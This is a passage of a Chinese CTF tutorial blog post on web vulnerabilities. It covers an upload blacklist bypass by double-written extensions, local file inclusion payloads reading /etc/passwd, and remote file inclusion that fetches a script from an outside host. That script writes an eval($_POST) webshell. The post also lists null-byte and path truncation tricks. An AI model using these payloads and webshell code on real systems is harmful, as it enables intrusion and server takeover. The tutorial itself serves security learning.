+<span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"php5"</span><span class="token punctuation">,</span> <span class="token string">"php4"</span><span class="token punctuation">,</span> <span class="token string">"php3"</span><span class="token punctuation">,</span> <span class="token string">"phtml"</span><span class="token punctuation">,</span> <span class="token string">"pht"</span><span class="token punctuation">,</span> <span class="token string">"jsp"</span><span class="token punctuation">,</span> <span class="token string">"jspa"</span><span class="token punctuation">,</span> <span class="token string">"jspx"</span><span class="token punctuation">,</span> <span class="token string">"jsw"</span><span class="token punctuation">,</span> <span class="token string">"jsv"</span><span class="token punctuation">,</span> <span class="token string">"jspf"</span><span class="token punctuation">,</span> <span class="token string">"jtml"</span><span class="token punctuation">,</span> <span class="token string">"asp"</span><span class="token punctuation">,</span> <span class="token string">"aspx"</span><span class="token punctuation">,</span> <span class="token string">"asa"</span><span class="token punctuation">,</span> <span class="token string">"asax"</span><span class="token punctuation">,</span> <span class="token string">"ascx"</span><span class="token punctuation">,</span> <span class="token string">"ashx"</span><span class="token punctuation">,</span> <span class="token string">"asmx"</span><span class="token punctuation">,</span> <span class="token string">"cer"</span><span class="token punctuation">,</span> <span class="token string">"swf"</span><span class="token punctuation">,</span> <span class="token string">"htaccess"</span><span class="token punctuation">,</span> <span class="token string">"ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>发现⼀个经典的 BUG 写法：</p>
+<pre><code>$name = str_replace($blacklist, &quot;&quot;, $name);</code></pre><p>这种情况⼀般都可以进行双写绕过：上传的⽂件名为 shell.pphphp ，那么被替换之后就为 shell.php</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200905165104956.png" alt=""> </p>
+</li>
+</ul>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote>
+<p>开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含</p>
+</blockquote>
+<p>文件包含漏洞形成也主要是开发人员为了使代码更灵活,会将被包含的文件设置为变量,用来进行动态调用,从而导致客户端可以恶意调用一个恶意文件,造成文件包含漏洞。</p>
+<pre><code>#文件包含特征
+?page=a.php
+?home=b.html
+?file=content</code></pre><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><blockquote>
+<p>能够打开并包含本地⽂件的漏洞，被称为本地⽂件包含漏洞(Local File Inclusion，简称 LFI)</p>
+</blockquote>
+<p>同样使用CTFHup靶场中文件包含题目进行演示</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     
+    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token shell-comment comment">#包含文件 file作为GET请求</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>尝试一些存在本地包含的验证方式</p>
+<pre><code>http://challenge...ctfhub.com:10080/file=../../../../../../../../../../../../../../etc/passwd   #相对路径
+http://challenge...ctfhub.com:10080/?file=/etc/passwd                                           #绝对路径
+http://challenge-053ba51fded77f37.sandbox.ctfhub.com:10080/?file=file:///etc/passwd             #file路径读取</code></pre><img src="http://106.52.86.96/202008230000/image-20200823205837738.png"  style="zoom:67%;" />
+
+<h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><blockquote>
+<p>PHP 不仅可以对本地⽂件进⾏包含，还可以对远程⽂件进⾏包含(Remote File Inclusion，简称 RFI)。</p>
+</blockquote>
+<p>同样在CTFHup靶场中演示远程包含文件的具体，主体php代码保持不变，我们通过提示文件中的phpinfo可以知道服务端php参数，allow_url_fopen,allow_url_include（(PHP 5.2 之后默认为 Off)）参数均属于On状态，可以尝试远程执行代码方式进行解题。</p>
+<img src="http://106.52.86.96/202008230000/image-20200823205401848.png" style="zoom:75%;" />
+
+<p><img src="http://106.52.86.96/202008230000/image-20200823204907289.png" alt=""></p>
+<pre><code>#通过远程文件包含，执行木马文件生成~
+http://challenge-3603087cdba29069.sandbox.ctfhub.com:10080/?file=http://106.52.86.96/CTF/hack.php</code></pre><p>hack.php文件内容如下：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token shell-comment comment">#生成shell木马文件</span>
+    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">'&lt;?php @eval($_POST["shell"]);echo "Show Time...."?>'</span><span class="token punctuation">;</span>  
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>成功执行生成木马文件后</p>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#远程执行木马文件~ 一句话木马</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//challenge-3603087cdba29069.sandbox.ctfhub.com:10080/?file=http://106.52.86.96/CTF/hack.php</span>
+<span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"Show Time...."</span><span class="token delimiter">?></span></code></pre>
+<p>使用中国蚂蚁成功getshell</p>
+<img src="http://106.52.86.96/202008230000/image-20200823212717658.png" style="zoom:60%;" />
+
+
+
+<h4 id="文件包含之截断"><a href="#文件包含之截断" class="headerlink" title="文件包含之截断"></a>文件包含之截断</h4><blockquote>
+<p>大多数程序猿认为 PHP 中的包含漏洞⽐较好修复，固定扩展名即可，代码如下：</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>当进行包含时，不需要传输⽂件扩展名，例如，想要包含 News.php页面，只需要传⼊?file=News 即可。这样可以变相地修复包含漏洞</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200824000321435.png" alt=""></p>
+<p>这个导致我们无法随心所欲地去读取系统文件信息了，因为这个文件显然是不存在的，这个时候程序就会想到使用字符串截断的方法来进行绕过</p>
+<h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><strong>%00截断</strong></h5><p>截断的原理：PHP 内核是由 C 语言实现的，所以使用了 C 语语言中的⼀些字符串处理函数。⽐如在连接字符串时候， 0 字节(\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加⼊⼀个 0字节，就能截断 file 变量之后的字符串</p>
+<pre><code>?file=payload.txt\0</code></pre><p>因为浏览器 URL 并不⽀持 \ ，因此通过浏览访问的时候需要通过 urlencode 进行编码，变成：</p>
+<pre><code>?file=payload.txt%00</code></pre><p><img src="http://106.52.86.96/202008230000/image-20200824001548863.png" alt=""></p>
+<h5 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a><strong>路径长度截断</strong></h5><p>Windows 下⽬录最大长度为 256 字节，超出的部分会被丢弃；Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。 ./ 表示当前路径。</p>
+<pre><code>?file=payload.txt././././././././超过⼀定数量的./././././././././././././././././././././././</code></pre><p>这种方法只使用于</p>
+<ul>
+<li>magic_quotes_gpc = Off</li>
+<li>PHP 版本小于 5.3.4</li>
+</ul>
+<p>如果为 On %00(NULL)将会被转义，从而无法正常截断。magic_quotes_gpc 为 On 的情况会为以下预定义字符转义:</p>
+<ul>
+<li><p>单引号(‘)</p>
+</li>
+<li><p>双引号(“)</p>
+</li>
+<li><p>反斜杠()</p>
+</li>
+<li><p>NULL</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200824001534830.png" alt=""></p>
+</li>
+</ul>
+<h5 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a><strong>点号截断</strong></h5><p>条件：PHP 的老版本（PHP &lt;=5.3.4），Winodws 下⽬录最大长度为 256 字节，Windows 下 cd … 显示的还是当前⽬录（点的数量不等于2时）</p>
+<pre><code>?file=payload.txt........超过⼀定数量的........</code></pre><p><img src="http://106.52.86.96/202008230000/image-20200824001523873.png" alt=""></p>
+<h5 id="远程文件截断"><a href="#远程文件截断" class="headerlink" title="远程文件截断"></a>远程文件截断</h5><p>可以通过空格、井号、问号截断绕过，不受GPC和PHP版本限制，只要能返回代码给包含函数，它就能执行：</p>
+<pre><code>#空格截断
+?file=http://192.168.31.89/fi/payload.txt%20
+
+#问号截断
+?file=http://192.168.31.89/fi/payload.txt?
+
+##号截断
+?file=http://192.168.31.89/fi/payload.txt%23</code></pre>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">chencf</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://itboy-chencf.github.io/2020/08/24/web-lou-dong-gong-ji/">https://itboy-chencf.github.io/2020/08/24/web-lou-dong-gong-ji/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">chencf</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'w0T1J2xSlO3HUf9QL1NDhe06-gzGzoHsz',
+        appKey: 'RugxYqP1PisA7oQdUCUkvlQT',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/09/06/upload-labs-ba-chang-tong-guan-shou-ce/">
+                    <div class="card-image">
+                        
+                        <img src="http://106.52.86.96/202009060800/tatle.png" class="responsive-img" alt="Upload-Labs靶场-通关手册">
+                        
+                        <span class="card-title">Upload-Labs靶场-通关手册</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-09-06
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/07/28/pyq5-chu-ti-yan/">
+                    <div class="card-image">
+                        
+                        <img src="http://106.52.86.96/202007281309/title.png" class="responsive-img" alt="Pyqt5-运维管理工具">
+                        
+                        <span class="card-title">Pyqt5-运维管理工具</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Pyqt是一套Python绑定Digia QT5应用的框架。它可用于Python 2和3,Qt库是最强大的GUI库之一,本工具也是基于Pyqt的简易运维管理工具(非通用版)，利用可视化组件来达到减轻运维管理人员的成本与效率。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Python/" class="post-category">
+                                    Python
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E8%BF%90%E7%BB%B4/">
+                        <span class="chip bg-color">运维</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%B7%A5%E5%85%B7/">
+                        <span class="chip bg-color">工具</span>
+                    </a>
+                    
+                    <a href="/tags/Pyqt5/">
+                        <span class="chip bg-color">Pyqt5</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">Chencf</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">14.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
